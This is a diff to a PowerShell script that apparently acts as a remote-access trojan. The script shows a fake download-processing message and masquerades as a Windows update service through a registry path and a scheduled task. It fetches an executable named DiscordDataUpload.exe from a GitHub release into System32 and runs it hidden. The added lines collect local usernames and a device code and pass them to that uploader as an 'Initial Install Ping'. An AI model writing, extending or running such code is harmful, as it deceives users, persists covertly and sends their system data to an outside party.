@@ -1,9 +1,7 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Write-Host "Processing Your Downloaded File, Please Don't Close this window" -ForegroundColor Yellow -BackgroundColor Black
 $regPath = "HKLM:\Software\WindowsUpdateService"
-$userNamesRaw = Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }
-$userNamesClean = $userNamesRaw -join ' | '
-$userNames = '"' + $userNamesClean + '"'
+$userNames = '(' + ((Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }) -join ', ') + ')'
 $exepath =  "C:/Windows/System32/DiscordDataUpload.exe"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
 $messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
@@ -108,10 +106,9 @@ if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
 Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
 Start-ScheduledTask -TaskName $updateserv
 #DataUpload
+$combineddata = "Initial Install Ping || Device Code: **$code** // $userNames" 
 Invoke-WebRequest -Uri $messageboturl -OutFile $exePath -UseBasicParsing
-Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $code
-Start-Sleep 2
-Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $userNames
+Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $combineddata
 Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
 # Removal of directories
 $ps1Files = @("C:\Windows\WindowsUpdateService.ps1", "C:\Windows\WindowsUpdateServiceDaemon.ps1")
